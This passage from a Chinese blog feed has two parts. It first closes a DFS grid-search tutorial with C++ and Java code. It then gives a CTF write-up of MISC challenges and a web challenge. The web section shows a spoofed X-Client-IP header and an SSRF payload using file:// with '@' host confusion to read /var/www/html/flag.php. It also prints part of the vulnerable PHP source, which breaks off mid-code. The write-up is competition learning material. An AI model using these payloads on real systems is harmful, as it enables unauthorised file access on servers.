href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>的<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTML文件</a>) 。在一个HTML文件中，当一个<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>被选择后，被链接的HTML文件将执行深度优先搜索，即在搜索其余的超链结果之前必须先完整地搜索单独的一条链。深度优先搜索沿着HTML文件上的<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>走到不能再深入为止，然后返回到某一个HTML文件，再继续选择该HTML文件中的其他超链。当不再有其他<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>可选择时，说明搜索已经结束。</p></blockquote><blockquote><p>经常遇到的不仅有DFS，还有BFS(Breadth First Search):</p><p>宽度优先<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">搜索算法</a>（又称广度优先搜索）是最简便的图的搜索算法之一，这一算法也是很多重要的图的算法的原型。Dijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">单源最短路径</a>算法和Prim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">最小生成树</a>算法都采用了和宽度优先搜索类似的思想。其别名又叫BFS，属于一种盲目搜寻法，目的是系统地展开并检查图中的所有节点，以找寻结果。换句话说，它并不考虑结果的可能位置，彻底地搜索整张图，直到找到结果为止。</p><p>BFS在求解最短路径或者最短步数上有很多的应用。应用最多的是在走迷宫上。</p></blockquote><p>根据题意，我们需要向八个方向进行搜索，并且进行判断</p><p>可以用c++写出：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义全局的，m和n</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//主函数</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>flag<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//接受多组数据</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cin<span class="token operator">>></span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义深度优先搜索</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//跟个扫描仪似的，递归搜索</span>    <span class="token comment" spellcheck="true">//如果不为@或者超出范围，则停止该方向搜索</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'@'</span><span class="token operator">||</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>j<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>i<span class="token operator">></span>m<span class="token operator">||</span>j<span class="token operator">></span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//向八个方向进行继续搜索</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//根据dfs的特点，访问过的顶点需要标记(这里置为*)，防止重复递归爆炸</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>java重构版:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//注意这里因为是动态申请数组，与C++不同，如果不先判断好参数大小，会导致数组越界的问题</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//向八个方向进行继续搜索</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//根据dfs的特点，访问过的顶点需要标记(这里置为*)，防止重复递归爆炸</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//当元素过多无法列举时，动态申请数组以下面这种方式</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//用Scanner定义输入</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//相当于c++中的EOF判断</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>其实是顺便练习一下java，c++和java有比较多相似之处，但是也有一些不同的地方，所以需要好好注意。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;一个DFS水题（对我来说不水）&quot;&gt;&lt;a href=&quot;#一个DFS水题（对我来说不水）&quot; class=&quot;headerlink&quot; title=&quot;一个DFS水题（对我来说不水）&quot;&gt;&lt;/a&gt;一个DFS水题（对我来说不水）&lt;/h1&gt;&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="DFS" scheme="http://www.yof3ng.xyz/tags/DFS/"/>
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="coding" scheme="http://www.yof3ng.xyz/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>第四届上海网安暨全国邀请赛_赛后小结</title>
    <link href="http://www.yof3ng.xyz/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
    <id>http://www.yof3ng.xyz/2018/11/06/第四届上海网安暨全国邀请赛-赛后小结/</id>
    <published>2018-11-06T02:32:35.000Z</published>
    <updated>2018-11-06T08:34:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第四届上海网安暨全国邀请赛-赛后小结"><a href="#第四届上海网安暨全国邀请赛-赛后小结" class="headerlink" title="第四届上海网安暨全国邀请赛_赛后小结"></a>第四届上海网安暨全国邀请赛_赛后小结</h1><blockquote><p>打完这个第四届上海大学生网络安全竞赛后，简单做个小结，巩固一下😭。</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到BASE32"><a href="#签到BASE32" class="headerlink" title="签到BASE32"></a>签到BASE32</h3><blockquote><p>第一道题是BASE32，签到题，飘过。</p></blockquote><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote><p>第二题是python的反编译，一个pyc文件。</p><p>可能我是碰巧做出来的，通过import导包（import是个好东西，pyc都能导），可以得到一个列表<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>，按列表顺序依次对”f”,”l”,”a”,”g”,异或可以得到key值为102，然后对列表进行异或操作可以得到flag。</p><p>但是大佬们是怎么去做这题的呢：发现pyc文件中有恶意插入的一行字节码，正是因为这个，导致pyc无法被反编译，删除之后反编译可以得到：</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>分析清楚逻辑之后可以逆出flag。</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>大杂烩，首先通过wireshark提取出两张图片（实际上数据包中还藏着一些不为人知的东西），其中一张是关键：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>可以看到有个<code>ct??????</code>，莫非是ctf什么的，六个问号，八位。（后面官方给出提示，openbuff（某一不知道哪个角落的隐写软件），crc碰撞，以及碰撞出来的值中含有f）。</p><p>这个时候就懵逼了，拿什么去crc碰撞，碰撞完又能干啥？</p><p>仔细看看数据包中，出现了crc字眼，并且含有3个疑似crc的值：</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>拿crc碰撞脚本进行碰撞得到三组中每组含有f的值：</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>然后拿openbuff进行解密，需要三个密钥，也就是上面三组进行排列组合，而且开头还需要加上ct，即可getflag。</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmm没啥好说的，考点就是字符串反转，以及对字符的敏感性，还有对base92的了解，题目给出了92基本上可以知道base92这玩意儿了，后面的难度不是特别大，需要一定的灵活性。</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>这次的web感觉全是php，比较”硬核”。</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>通过post 传admin=1并且用x-client-ip伪造本地ip，即可到达用url打ssrf的地步，通过指定url，打到的内容会以图片格式存储到download目录。</p><p>这里需要用 file协议，而不是http协议。</p><p>大佬是这样构造url的：</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>而我：</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>可能又是碰巧打到的？我们可以获得source.php的源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token 